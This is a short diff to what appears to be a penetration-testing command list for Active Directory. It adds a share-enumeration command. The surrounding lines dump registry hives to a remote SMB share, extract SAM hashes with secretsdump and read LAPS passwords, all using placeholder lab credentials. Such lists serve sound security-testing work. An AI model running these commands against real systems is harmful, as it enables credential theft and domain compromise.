@@ -336,4 +336,5 @@ reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 
 reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' backup -o '\\192.168.56.1\SHUTDOWN'
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 pyLAPS.py --action get -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
+FindUncommonShares.py -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
